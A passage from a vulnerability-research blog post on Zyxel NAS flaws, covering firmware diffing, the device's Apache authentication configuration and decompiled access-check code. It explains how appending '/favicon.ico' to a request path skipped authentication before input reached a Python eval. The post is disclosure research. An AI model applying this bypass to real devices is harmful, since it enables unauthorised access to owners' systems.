</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-21' id='mega-menu-item-21'><a class="mega-menu-link" href="/resources/" aria-expanded="false" tabindex="0" aria-label="menu link to Resources">Resources<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-150' id='mega-menu-item-150'><a class="mega-menu-link" href="/resources/#research" aria-label="menu link to Research"><span class="mega-description-group"><span class="mega-menu-title">Research</span><span class="mega-menu-description">In-depth reports compiled by KrakenLabs, our Threat Intelligence analysts</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-149' id='mega-menu-item-149'><a class="mega-menu-link" href="/resources/#datasheets" aria-label="menu link to Datasheets"><span class="mega-description-group"><span class="mega-menu-title">Datasheets</span><span class="mega-menu-description">Downloadable datasheets for products and services</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-151' id='mega-menu-item-151'><a class="mega-menu-link" href="/resources/#webinar" aria-label="menu link to Videos &amp; Webinars"><span class="mega-description-group"><span class="mega-menu-title">Videos & Webinars</span><span class="mega-menu-description">On-demand webinars and product videos</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-2913' id='mega-menu-item-2913'><a class="mega-menu-link" href="/resources/#whitepaper" aria-label="menu link to Whitepapers"><span class="mega-description-group"><span class="mega-menu-title">Whitepapers</span><span class="mega-menu-description">Industry and best practice guides for securing your business</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-5322' id='mega-menu-item-5322'><a class="mega-menu-link" href="/resources/#event" aria-label="menu link to Upcoming Events"><span class="mega-description-group"><span class="mega-menu-title">Upcoming Events</span><span class="mega-menu-description">Cybersecurity conferences, events, and webinars organized by Outpost24</span></span></a></li></ul>
</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-630' id='mega-menu-item-630'><a class="mega-menu-link" href="https://outpost24.com/support/" tabindex="0" aria-label="menu link to Support">Support</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-5923' id='mega-menu-item-5923'><a class="mega-menu-link" href="https://outpost24.com/partners/" tabindex="0" aria-label="menu link to Partners">Partners</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-2335' id='mega-menu-item-2335'><a class="mega-menu-link" href="https://outpost24.com/company/" aria-expanded="false" tabindex="0" aria-label="menu link to Company">Company<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2515' id='mega-menu-item-2515'><a class="mega-menu-link" href="https://outpost24.com/company/" aria-label="menu link to Company Overview"><span class="mega-description-group"><span class="mega-menu-title">Company Overview</span><span class="mega-menu-description">Our mission to fight cybercrime, and who we are</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-5857' id='mega-menu-item-5857'><a class="mega-menu-link" href="https://outpost24.com/news/" aria-label="menu link to Newsroom"><span class="mega-description-group"><span class="mega-menu-title">Newsroom</span><span class="mega-menu-description">Our latest announcements, press mentions, and media contact information.</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2336' id='mega-menu-item-2336'><a class="mega-menu-link" href="https://outpost24.com/certifications/" aria-label="menu link to Certifications"><span class="mega-description-group"><span class="mega-menu-title">Certifications</span><span class="mega-menu-description">Cybersecurity certifications and adherence to industry best practice standards</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-157' id='mega-menu-item-157'><a class="mega-menu-link" href="/customers/" aria-label="menu link to Customers"><span class="mega-description-group"><span class="mega-menu-title">Customers</span><span class="mega-menu-description">Real-world examples of how Outpost24 helps businesses improve their security posture</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2589' id='mega-menu-item-2589'><a class="mega-menu-link" href="https://outpost24.com/esg/" aria-label="menu link to ESG"><span class="mega-description-group"><span class="mega-menu-title">ESG</span><span class="mega-menu-description">Our principles and commitments as a global citizen</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-159' id='mega-menu-item-159'><a class="mega-menu-link" href="https://careers.outpost24.com/#jobs" aria-label="menu link to Careers"><span class="mega-description-group"><span class="mega-menu-title">Careers</span><span class="mega-menu-description">We’re hiring! Check out our current openings</span></span></a></li></ul>
</li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-align-bottom-left mega-menu-flyout mega-menu-item-6270 is-hidden--desktop' id='mega-menu-item-6270'><a class="mega-menu-link" href="https://careers.outpost24.com/#jobs" tabindex="0" aria-label="menu link to Careers">Careers</a></li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-current_page_parent mega-align-bottom-left mega-menu-flyout mega-menu-item-6271 is-hidden--desktop' id='mega-menu-item-6271'><a class="mega-menu-link" href="https://outpost24.com/blog/" tabindex="0" aria-label="menu link to Blog">Blog</a></li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-6272 is-hidden--desktop' id='mega-menu-item-6272'><a class="mega-menu-link" href="https://outpost24.com/pricing/" tabindex="0" aria-label="menu link to Pricing">Pricing</a></li><li class='mega-is-hidden--desktop mega-primary-button mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-6273 is-hidden--desktop primary-button' id='mega-menu-item-6273'><a class="mega-menu-link" href="https://outpost24.com/contact/" tabindex="0" aria-label="menu link to Contact">Contact</a></li></ul></div><a href="/contact/" class="primary-button">Contact Us</a>		</div>
	</div>
</div> 

		</div>
	</header>
	<main id="primary" class="site-main" role="main">
		

<div class="container"><div class="breadcrumbs" xmlns:v="http://rdf.data-vocabulary.org/#"><a href="https://outpost24.com/blog/">Blog</a> &nbsp;/&nbsp; <span typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="https://outpost24.com/blog/category/research-and-threat-intel/">Research &amp; Threat Intel</a></span> &nbsp;/&nbsp; <span class="current">Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)</span></div><!-- .breadcrumbs --></div>
<div class="container margin-bottom--lg single-toc-post">
	 <div id="ez-toc-container" class="ez-toc-v2_0_71 ez-toc-wrap-left counter-hierarchy ez-toc-counter ez-toc-custom ez-toc-container-direction">
<div class="ez-toc-title-container"><p class="ez-toc-title" style="cursor:inherit">Contents</p>
</div><nav><ul class='ez-toc-list ez-toc-list-level-1 ' ><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-1" href="#background" title="Background">Background</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-2" href="#the-initial-work" title="The initial work">The initial work</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-3" href="#the-issue-with-half-baked-patches" title="The issue with half-baked patches">The issue with half-baked patches</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-4" href="#our-findings" title="Our findings">Our findings</a><ul class='ez-toc-list-level-3' ><li class='ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-5" href="#cve-2024-29972-%e2%80%93-nsarescueangel-backdoor-account" title="CVE-2024-29972 &#8211; NsaRescueAngel Backdoor Account">CVE-2024-29972 &#8211; NsaRescueAngel Backdoor Account</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-6" href="#password-generation" title="Password generation">Password generation</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-7" href="#cve-2024-29976-%e2%80%93-privilege-escalation-and-information-disclosure-vulnerability" title="CVE-2024-29976 &#8211; Privilege Escalation and Information Disclosure Vulnerability">CVE-2024-29976 &#8211; Privilege Escalation and Information Disclosure Vulnerability</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-8" href="#cve-2024-29973-%e2%80%93-python-code-injection-vulnerability" title="CVE-2024-29973 – Python Code Injection Vulnerability">CVE-2024-29973 – Python Code Injection Vulnerability</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-9" href="#cve-2024-29975-%e2%80%93-local-privilege-escalation-vulnerability" title="CVE-2024-29975 &#8211; Local Privilege Escalation Vulnerability">CVE-2024-29975 &#8211; Local Privilege Escalation Vulnerability</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-10" href="#bonus-escaping-filtration" title="Bonus: Escaping filtration">Bonus: Escaping filtration</a></li><li class='ez-toc-page-1 ez-toc-heading-level-3'><a class="ez-toc-link ez-toc-heading-11" href="#cve-2024-29974-%e2%80%93-persistent-remote-code-execution-vulnerability" title="CVE-2024-29974 – Persistent Remote Code Execution Vulnerability">CVE-2024-29974 – Persistent Remote Code Execution Vulnerability</a></li></ul></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-12" href="#the-importance-of-security-testing" title="The importance of security testing">The importance of security testing</a></li><li class='ez-toc-page-1 ez-toc-heading-level-2'><a class="ez-toc-link ez-toc-heading-13" href="#about-ghost-labs" title="About Ghost Labs">About Ghost Labs</a></li></ul></nav></div>
 	<article id="post-5971" class="post-5971 post type-post status-publish format-standard has-post-thumbnail hentry category-research-and-threat-intel">
		<div class="post-wrapper">
			<div class="blog-page">
				<div class="article-heading">
					<h1 class="entry-title">Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)</h1>					<div class="post-info">
						<span class="post-category">
							<a href="https://outpost24.com/blog/category/research-and-threat-intel/">Research &amp; Threat Intel</a>							</span>
							<span class="post-date">Last updated: 20 Aug 2024</span>
						</div>
					</div>
											<div class="article-author">
							<span class="written-by">Written By</span>
																							<div class="author-container">
									<span class="author-name"><a href="https://outpost24.com/blog/authors/timothy-hjort/">Timothy Hjort</a></span>
									<span class="author-title">Student Intern in Vulnerability Research, Outpost24</span>
								</div>
													</div>
										
<p>During some standard research as part of the Outpost24 Vulnerability Research Department, I discovered 5 vulnerabilities in Zyxel NAS devices:</p>



<ul class="wp-block-list">
<li>CVE-2024-29972 &#8211; NsaRescueAngel Backdoor Account</li>



<li>CVE-2024-29976 &#8211; Privilege Escalation and Information Disclosure Vulnerability</li>



<li>CVE-2024-29973 – Python Code Injection Vulnerability</li>



<li>CVE-2024-29975 &#8211; Local Privilege Escalation Vulnerability</li>



<li>CVE-2024-29974 – Persistent Remote Code Execution Vulnerability</li>
</ul>



<p>The vulnerabilities were disclosed to Zyxel on 2024-03-14 as part of our responsible disclosure policy, and have been resolved at the time of publishing this post (2024.06.04).</p>



<h2 class="wp-block-heading" id="h-background"><span class="ez-toc-section" id="background"></span>Background<span class="ez-toc-section-end"></span></h2>



<p>In August 2023, I started investigating CVE-2023-27992, a pre-authentication command injection found in some Zyxel NAS devices. Back then, IBM had yet to release their awesome <a href="https://securityintelligence.com/x-force/ibm-identifies-zero-day-vulnerability-zyxel-nas-devices/">blog post</a> so I ended up taking an approach practically identical to <a href="https://www.fullspectrum.dev/getting-some-of-the-way-patch-diffing-cve-2023-27992-zyxel-nas-pre-auth-rce/">Darren Martyn’s</a>, and coincidentally, IBMs’ approach of finding the files (download the vulnerable firmware, unpack it with binwalk and compare the files to newer versions to figure out what changed). We also purchased an affected device for integration testing. Extracting the firmware files was made easier with that, since I could now just ssh into it and access the files.<a></a></p>



<h2 class="wp-block-heading" id="h-the-initial-work"><span class="ez-toc-section" id="the-initial-work"></span>The initial work<span class="ez-toc-section-end"></span></h2>



<p>Based upon NVDs description of CVE-2023-27992 I figured the vulnerability was present in a web server, and based upon my own experience on integrated devices affected by command injections, I figured this would be a CGI webserver.</p>



<figure class="wp-block-image size-large"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image1-1024x338.jpg" alt="" class="lazy lazy-hidden wp-image-5606" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image1-1024x338.jpg" alt="" class="wp-image-5606" /></noscript><figcaption class="wp-element-caption">Figure 1: NVD description of CVE-2023-27992</figcaption></figure>



<p>Diffing two firmware versions indicated a lot of changes to ”.pyc” files, which are python bytecode, for what was named remarkably webserver-y:</p>



<figure class="wp-block-image size-large"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image2-1024x274.jpg" alt="" class="lazy lazy-hidden wp-image-5608" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image2-1024x274.jpg" alt="" class="wp-image-5608" /></noscript></figure>



<p>Continuing the research I found a binary called ”httpd”, some configuration files loading a WSGI module, as well as a cool custom module which appeared to be focused on authentication: <a>mod_auth_zyxel</a>. Additionally, it defined three variables of interest:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="/ $ cat etc/service_conf/httpd.conf 

[...]

LoadModule auth_zyxel_module    /usr/local/apache/modules/mod_auth_zyxel.so
LoadModule rewrite_module /usr/local/apache/modules/mod_rewrite.so
LoadModule wsgi_module /usr/local/apache/modules/mod_wsgi.so
LoadModule proxy_module /usr/local/apache/modules/mod_proxy.so
LoadModule proxy_http_module /usr/local/apache/modules/mod_proxy_http.so
  
[...]

AuthZyxelRedirect /r51280,/desktop,/login.html
AuthZyxelSkipPattern /favicon.ico /adv,/cgi-bin/weblogin.cgi /desktop,/cgi-bin/weblogin.cgi /desktop,/cgi-bin/file_download.cgi /desktop,/cgi-bin/dlnotify /desktop,/login.html /desktop,/res/ /desktop,/css/ /desktop,/utility/flag.js /MyWeb/ /register_main/setCookie /playzone,/mobile_login.html /playzone,/mobile/sencha/ /playzone,/mobile/images/ /playzone,/images/
AuthZyxelSkipUserPattern /playzone,/ /cmd,/ /DMS,/ /adv,/cgi-bin/ /desktop,/cgi-bin/ /desktop,/" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">/</span><span style="color: #D8DEE9FF"> $ </span><span style="color: #A3BE8C">cat</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">etc/service_conf/httpd.conf</span><span style="color: #D8DEE9FF"> </span></span>
<span class="line"></span>
<span class="line"><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">...</span><span style="color: #ECEFF4">]</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">LoadModule</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">auth_zyxel_module</span><span style="color: #D8DEE9FF">    </span><span style="color: #A3BE8C">/usr/local/apache/modules/mod_auth_zyxel.so</span></span>
<span class="line"><span style="color: #88C0D0">LoadModule</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">rewrite_module</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/usr/local/apache/modules/mod_rewrite.so</span></span>
<span class="line"><span style="color: #88C0D0">LoadModule</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">wsgi_module</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/usr/local/apache/modules/mod_wsgi.so</span></span>
<span class="line"><span style="color: #88C0D0">LoadModule</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">proxy_module</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/usr/local/apache/modules/mod_proxy.so</span></span>
<span class="line"><span style="color: #88C0D0">LoadModule</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">proxy_http_module</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/usr/local/apache/modules/mod_proxy_http.so</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span></span>
<span class="line"><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">...</span><span style="color: #ECEFF4">]</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">AuthZyxelRedirect</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/r51280,/desktop,/login.html</span></span>
<span class="line"><span style="color: #88C0D0">AuthZyxelSkipPattern</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/favicon.ico</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/adv,/cgi-bin/weblogin.cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/cgi-bin/weblogin.cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/cgi-bin/file_download.cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/cgi-bin/dlnotify</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/login.html</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/res/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/css/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/utility/flag.js</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/MyWeb/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/register_main/setCookie</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/playzone,/mobile_login.html</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/playzone,/mobile/sencha/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/playzone,/mobile/images/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/playzone,/images/</span></span>
<span class="line"><span style="color: #88C0D0">AuthZyxelSkipUserPattern</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/playzone,/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/cmd,/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/DMS,/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/adv,/cgi-bin/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/cgi-bin/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/desktop,/</span></span></code></pre></div>



<p>With these names, it is reasonable to guess that they are used in their custom authentication module.</p>



<p>Decompiling the module confirmed that <a>AuthZyxelSkipPattern</a> was being used:</p>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image3.png" alt="" class="lazy lazy-hidden wp-image-5609" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image3.png" alt="" class="wp-image-5609" /></noscript></figure>



<p>Further searching showed a function utilizing <a>strstr</a>, which caught my interest. I found that it lowercases two strings, a1 and a2, before checking whether a2 is a substring of a1.</p>



<figure class="wp-block-image size-full"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image4.png" alt="" class="lazy lazy-hidden wp-image-5610" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image4.png" alt="" class="wp-image-5610" /></noscript></figure>



<p>Tracking what functions are calling it and climbing the calling tree we finally reach the main body of the authentication module:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="int check_accecss(astruct *request)
{
  // [...]
    /* Skip patterns */
    status_code = compare_url(request_00,(char **)request);
    if (status_code == 0) {
      status_code = strcmp(request-&gt;field209_0xe0,*mod_cfg);
      /* deny_list */
      if ((status_code != 0) &amp;&amp;
         (request_01.address = (int)in_stack_ffff8924,
         request_01.server = (int)((ulonglong)in_stack_ffff8924 &gt;&gt; 0x20),
         request_01.pool = in_stack_ffff8920, request_01._12_4_ = request,
         request_01._16_228_ = in_stack_ffff8930,
         status_code = compare_url(request_01,(char **)request), status_code != 0)) {
        apr_table_set(request-&gt;headers_out,&quot;Location&quot;,output_redirect_location);
        return 302;
      }
      // [...]
      return status_code;
    }
    return 0;
  }
  return -1;
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">check_accecss</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">astruct </span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9">request</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #616E88">    /* Skip patterns */</span></span>
<span class="line"><span style="color: #D8DEE9FF">    status_code </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">compare_url</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">request_00</span><span style="color: #ECEFF4">,(</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">**</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">request</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">status_code </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">      status_code </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strcmp</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">request</span><span style="color: #81A1C1">-&gt;</span><span style="color: #D8DEE9">field209_0xe0</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9FF">mod_cfg</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #616E88">      /* deny_list */</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">((</span><span style="color: #D8DEE9FF">status_code </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&amp;&amp;</span></span>
<span class="line"><span style="color: #D8DEE9FF">         </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">request_01</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">address</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">int</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">in_stack_ffff8924</span><span style="color: #ECEFF4">,</span></span>
<span class="line"><span style="color: #D8DEE9FF">         </span><span style="color: #D8DEE9">request_01</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">server</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">int</span><span style="color: #ECEFF4">)((</span><span style="color: #D8DEE9FF">ulonglong</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">in_stack_ffff8924 </span><span style="color: #81A1C1">&gt;&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">20</span><span style="color: #ECEFF4">),</span></span>
<span class="line"><span style="color: #D8DEE9FF">         </span><span style="color: #D8DEE9">request_01</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">pool</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> in_stack_ffff8920</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">request_01</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">_12_4_</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> request</span><span style="color: #ECEFF4">,</span></span>
<span class="line"><span style="color: #D8DEE9FF">         </span><span style="color: #D8DEE9">request_01</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">_16_228_</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> in_stack_ffff8930</span><span style="color: #ECEFF4">,</span></span>
<span class="line"><span style="color: #D8DEE9FF">         status_code </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">compare_url</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">request_01</span><span style="color: #ECEFF4">,(</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">**</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">request</span><span style="color: #ECEFF4">),</span><span style="color: #D8DEE9FF"> status_code </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">))</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">apr_table_set</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">request</span><span style="color: #81A1C1">-&gt;</span><span style="color: #D8DEE9">headers_out</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">Location</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">output_redirect_location</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">302</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #ECEFF4">      </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> status_code</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">-</span><span style="color: #B48EAD">1</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">}</span></span></code></pre></div>



<p>A lot of ugly, generated code has been truncated. It could be prettier if I bothered importing some Apache headers to get the proper function definitions and structs, but this was enough to understand what’s going on. The function boils down to taking our request, checking if any tokens in AuthZyxelSkipPattern (from the configuration file) are a substring of the request path, and if true, let the request through, and if not, check the rest of the pattern variables. The key for us is that it checks AuthZyxelSkipPattern before everything else, and that it only requires it to be a substring of our request.</p>



<p>As for the vulnerable endpoints in this CVE? I refer to IBM’s work on that. Zyxel took two sections from the request path and passed them down into a python eval. The patch they shipped added some rudimentary filtering and limited the maximum length that was allowed for the path to prevent attackers from bypassing authentication by simply appending “/favicon.ico” to the request. The filtered input was then passed into the very same eval.</p>



<p>&nbsp;Now to our own findings.</p>



<h2 class="wp-block-heading" id="h-the-issue-with-half-baked-patches"><span class="ez-toc-section" id="the-issue-with-half-baked-patches"></span><a>The issue with half-baked patches</a><span class="ez-toc-section-end"></span></h2>



